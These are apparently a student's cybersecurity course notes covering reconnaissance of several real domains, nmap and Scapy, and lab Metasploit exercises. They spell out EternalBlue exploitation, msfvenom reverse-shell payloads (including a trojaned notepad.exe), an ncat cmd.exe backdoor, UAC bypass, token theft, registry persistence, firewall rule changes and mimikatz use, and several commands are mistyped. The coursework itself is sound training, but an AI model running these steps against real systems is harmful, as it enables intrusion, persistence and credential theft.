# CTE - Week 4

## Classroom Links

* [Teams](https://teams.microsoft.com/l/team/19%3a7a166f374eb44c89bb972a20cf5a3d6e%40thread.tacv2/conversations?groupId=b0216bab-7ebb-498b-af22-3d7c8db2d92f&tenantId=37247798-f42c-42fd-8a37-d49c7128d36b)  
* [CLME](https://learn.dcita.edu/)

## Week 4

### Recon Types

* Passive
* Semi-passive
* Ative

### Recon Categories

* Infrastructure
  * Actively mapping network infrastructure through post scans
  * Actively enumerating and/or vulnerability scanning for open services
  * Actively seeking unpublished directoryies, files and servers
  * Should be detected by the targe ans supspicious or malicious behavior
* People
  * Create personnel and organizational profiles from customer's web presence
  * Identify possible vulnerabilities found in relevant open source information
  * Create persona and websit (callback) profiles (malware)
  * Harvest email addresses
  * Social engineering opportunities
  * Metadata for files, if found (data about data)
  * Lack of individual internet presence
* Organization
  * Discover all networks owned by the target
  * Identify presence in othe rcountries
  * Discover top level domains (TLD)
  * Build a network diagram
  
### Reonaissance Tools

* Native OS Tools (whois, nslookup, dig)
* Robtex
* Kali Open Sources Tools

Header1 | Header2 | Header3  
--- | --- | ---  
Shodan | Maltego | Metagoofil  
theHarvester | Recon-ng | ThreatMiner  

### Active Reconnaissance  

___  

### Passive Reconnaissance Exersize  

* IP Addresses
* Sub-Domains
* People responsible for network administration
* Contacts that might benefit in future operations
* Possible vulnerabilities
* Avenues of approach that could be used in later stages of an attack  

#### dcita.com  

* AWS Site
* whois  
  * Avenues of approach that could be used in later stages of an attack  
    * nsg1.namebrightdns.com
    * nsg2.namebrightdns.com
    * DNSSEC: unsigned
* nslookup
  * IP address
    * 3.223.115.185
* dig
  * No New info
* Shodan  
  * No Results by name
  * ![Shodan Results](./Files/CTE-Week4/ExersizeFiles/PassiveRecon/dicita-com-Shodan-Results.png)  
    * IIS 8.5
    * Port 80
* Maltego
* Metagoofil
* theHarvester
* Recon-ng
* ThreatMiner  
  * smmse.com - malware sample

#### dc3.mil  

* whois
  * No Info
* nslookup  
  * 23.2.157.129
* dig  
  * DNS Info
    * ns2.dc3.mil
    * ns3.dc3.mil
* Shodan  
* Maltego
* Metagoofil
* theHarvester
* Recon-ng
* ThreatMiner
  * AirForceSystemsNetworking
  * DNS IP - 214.3.152.70
  * IPInfo - AS385 - af.mil

#### dcita.edu  

* whois  
  * Avenues of approach that could be used in later stages of an attack
    * PDNS03.DOMAINCONTROL.COM
    * PDNS04.DOMAINCONTROL.COM
* nslookup  
  * IP Address
    * 35.153.155.228
* dig  
  * No New info
* Shodan  
  * No Results by name
  * ![Shodan Results](./Files/CTE-Week4/ExersizeFiles/PassiveRecon/dicita-edu-Shodan-Results.png)  
    * nginx  
    * Port 443
    * bootstrap; google tag manager; gsap; jquery; jquery UI  
* Maltego
* Metagoofil
* theHarvester
* Recon-ng
* ThreatMiner  

## Active Scanning

### Acitive Scanning and Enumeration

* Conduct active reconnaissance
* Develop mission reports from results of exploitation

### Methods of Scanning

* Passive discovery techniques
  * Monitor communications
  * Transparent
  * Take more time
* Active Discovery techniques
  * Fast
  * Provide a lot of information
  * Can trigger alerts
* Port Scaning
  * Determining ports that are open
  * Reveals presence of devices
  * Reconnaissance tool for attackers
* Vulnerability Scanning
  * Combines port scaning
  * Reveals hosts and servers for known vulnerabilities
  * Provides report
  
### Major Protocols Review

* Ethernet
![Ethernet_Header](./Files/CTE-Week4/ExersizeFiles/ActiveRecon/EthernetHeader.png)
* IPv4
![IPv4_Header](./Files/CTE-Week4/ExersizeFiles/ActiveRecon/IPv4Header.png)
* ICMP
![ICMP_Header](./Files/CTE-Week4/ExersizeFiles/ActiveRecon/ICMPHeader.png)
* TCP
![TCP_Header](./Files/CTE-Week4/ExersizeFiles/ActiveRecon/TCPHeader.png)
* UDP
![UDP_Header](./Files/CTE-Week4/ExersizeFiles/ActiveRecon/UDPHeader.png)

### Active Scanning Techniques

* Discovering Hosts (Network Mapping)
  * MAC and IP addresses
  * Host Names
  * Operationg systems (OSs)
  * Services running
* Broadcast pings and ping sweeps
* ARP scans
* ICMPv6 neighbor discovery
* Scanning Ports
  * What will happen when connecting to a TCP port?
  * What about UDP
* OS Detection
* Service and version detection
* Timing and optimizaion
* Fireall and IDS evasion
* Packet manipulation

### Scapy

* What is Scapy?
  * Program for manipulating packtes
  * Capbel of sniffing and tranmitting packets
  * Can handle many tasks:
    * Scanning
    * Traceroute
    * Host Discovery
    * Probing
    * And more
* Why use Scapy?
  * Very useful tool
  * Cross platform
  * Scripting in Python
  * Replay packets
* Important concepts
* Crafting packets
  ![Scapy](./Files/CTE-Week4/ExersizeFiles/ActiveRecon/Scapy.png)
* Sending and receiving packets

### NMAP

* Features include
  * Host and port scanning
  * OS detection
  * Detecting versions
  * Scriptable
* Uses include
  * Mapping networks
  * Identifying open ports
  * Security Auditing
* Graphical User Interface (Zenmap)
* NMAP Options
  * Discovery Options
    * List scan (-sL)
    * No port scan (-sn)
    * No Ping (-Pn)
    * TCP SYN ping (-PS)
    * TCP ACK ping (-PA)
    * UDP Ping (-PU)
    * SCTP INIT ping (-PY)
    * ICMP Ping Types (-PE; -PP; -PM)
    * IP protocol ping (-PO)
    * ARP ping (-PR)

### Exersises

* Scapy  

```scapy
packet = IP()/TCP()
packet[IP].dst = ["192.168.229.165","192.168.229.14","192.168.229.13","192.168.229.80","192.168.229.89","192.168.229.223"]
packet[TCP].dport = 135,445,80
```

* NCAT
  * Simple HTTP Server  
  `nc -lk -p 8080 --sh-exec "echo -e 'HTTP/1.1 200 OK\r\n'; cat index.html"`  
  * Backdoor
    * Listener -  `ncat -l -p 8080 -e cmd.exe`
    * Server -  `ncat <Listener ip_addr> 8080`
* Nping
  * Spoof MAC  
`nping --arp --arp-sender-mac 11:22:33:44:55:66 192.168.229.89, 192.168.22913`
* Install NSE Scripts
  * Download and copy script to `/usr/share/nmap/
scripts` or `/usr/local/share/nmap/scripts`
  * Copy any libraries (`.lua files`) to the `nselib folder`

## Metasploit Exersise 1

1. msfdb init -> msfconsole -> db_status

```Metasploit
  * Creating database user 'msf'
  * Creating databases 'msf'
  * Creating database 'msf_test'
  * Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
```
2. workspace -a Win7
3. search platform:Windows
4. search platform:Windows_name:reverse_tcp
5. use payload/windows/shell/reverse_tcp
   windows/x64/meterpreter/reverse_tcp
6. options
7. set LPORT 1234
8. setg LHOST 192.168.229.30
9. 283 bytes Or meterpreter 449
10. generate -b "\x52" -> 313 or 495
11. generate -e x86/shikata_ga_nai ->310 or 476
12. generate -e x86/shikata_ga_nai -t bash
13. search eternalblue
14. use exploit/windows/smb/ms17_010_eternalblue 
    set RHOST 192.168.229.18

15. set PAYLOAD windows/x64/meterpreter/reverse_tcp
16. exploit -> spoolsv.exe (getpid; ps)
17. getuid -> NT Authority\system
18. sysinfo
19. sysinfo
20. 0 or 3
  run post/windows/gather/enum_logged_on_usrers
21. WIN-FCQ0LBJ72KK
22. x64\Windows
23. localtime -> Eastern Daylight Time
24. sysinfo -> workgroup
25. idletime -> 10m 15s
26. showmount -> 2
27. execute -f systeminfo.exe -i -H -> ~2300 Mhz
28. pwd -> c:\windows\system32
29. lls -> /home/student
30. ps -> No
31. netstat -> yes
32. No path or process exclusions for windows defender
33. run windows/gather/enum_av_excluded
34. arp -> 14
35. reg enumkey -k "Hklm\system\currentcontrolset\enum\usbstor"
36. run post/windows/gather/enum_applications
37. run post/windows/gather/enum_prefetch

## Metasploit Exersise II

1. Using the Metasploit Venom payload generator and the 64-bit version of
the Meterpreter “reverse_tcp” payload, generate a custom, executable
payload for the Windows 10 VM using port 443. The payload should be
encoded through three iterations of “shikata_ga_nai”.
2. Name the new payload “totallynotavirus.exe” and save it in your viruses
folder. What command syntax was used?  
`msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp -e x64/xor LHOST=192.168.229.30 LPORT=443 -i 3-f exe -o totallynotavirus`
3. Create a listener on port 443 for the “reverse_tcp” payload using “exploit/multi/handler”. Ensure that the listener runs. Hint: from your current context, use the “msfconsole -x” command followed by your variables. What command syntax was used?  
`msfconsole -x "use exploit/multi/handler; use payload windows/x64/meterpreter_reverse_tcp; set LPORT 443; set LHOST 192.168.229.30; run`

### Walkthrough

1. mkdir ~/viruses
2. systemclt start apache2
3. Win10 -> Mitnick -> navigate to 192.168.229.30
4. msvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST==192.168.229.30 LPORT=443 -e x64/xor -i 3 -f exe -o ./viruses/totallynotaviruse.ext
5. cp ./viruses/totallynotaviruse.exe /var/www/html/totalynotaviruse.exe
6. msfconsole -x "use exploit/multi/handler; set payload windows/x64/reverse_tcp; set LHOST 192.168.229.30; set LPORT 443; run"
7. win10 - execute 192.168.229.30/totalynotaviruse.exe
8. meterrpeter > getuid
9. getpid -> look for explorer
10. migrate to `explorer PID`
11. background
12. use exploit/windows/local/bypassuac_injection_winsxs
13. set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.229.30
14. set LPORT 444
15. show targets
16. set target 1
17. set session 1
18. run
19. getuid
20. getsystem
21. getuid
22. netstat
23. load incognio
24. list_tokens -u
25. steal_token Administrator
26. impersonate_token Desktop-Name/Administrator
27. background
28. find / -name nc.exe
29. sessions 2
30. pwd
31. upload /usr/share/windows-biniaries/nc.exe
32. reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ - v vmware -d "nc -lu dp 445 - e cmd.exe"
33. Enter a windows command shell and add a firewall rule named “backdoor” to allow inbound traffic on TCP port 445 for your persistent netcat connection. What command syntax was used? `shell -> netsh advfirewall firewall add rule name="Backdoor" dir=in action=allow protocol=UDP localport=445`
34. Reboot your Windows 10 VM, then return to your Kali VM and open a new terminal window. Connect to the Windows 10 netcat listener. What command syntax was used? `nc 192.168.229.19 -u 445 -> cmd`
35. What Windows 10 account is your shell running under? `whoami -> desktop\Administrator`
36. From your Meterpreter session, enable remote desktop protocol on the Windows 10 target. What command syntax was used? `run post/windows/manage/enable_rdp -> Run getgui -u <username> -p <password>`
37. In a new terminal window, connect to the Windows 10 target via remote desktop. What command syntax was used `rdesktop -u administrator -p P@ssw0rd 192.168.229.19`
38. reg setval -l hklm\\system\\currentcontrolset\\control\\'Termainal Server'\\winstations\rdp-cp -v UserAuthentication -d 0
39. Run the clean-up command to remove the remote desktop credentials you previously injected. Does your user still exist on the Windows 10 target? `run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up_<date>.rc`
40. Load the mimikatz extension and attempt to gather the single sign on credentials from the Windows 10 target. What module was used? ``
41. Using Meterpreter, download notepad.exe to your Kali VM. How large, in bytes, is notepad.exe on the Windows 10 VM? `file notepad.exe` `msvenom -a x64 - --platform=windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.229.30 LPORT=443 -x ./notepad.exe -k -e x64/xor -i 3 -f exe -o ./viruses/notepad.exe`
42. Prepare a listener on the Kali VM and from the Windows 10 VM open notepad. On your Kali VM, what account is your Meterpreter shell under? `getuid`
Escalate your privilege to system level and load the sniffer extension. `load sniffer`
43. Begin a packet capture on the Windows 10 target’s network interface that Meterpreter is using. What command syntax was used? `sniffer_start 5` -> `sniffer_stop 5` -> `sniffer_dump 5 123.pcap`
44. Check the statistics of the current packet capture. What two fields are shown?
45. Add a port forwarding rule that will move traffic directed to port 445 locally on the Kali VM to the Windows 10 VM. What command syntax was used? ``
46. Using a new terminal window, open a telnet connection to port 445 on your loopback address. What command shell are you currently in?
47. How many processes are currently running that could potentially tip off the Windows 10 user to your presence?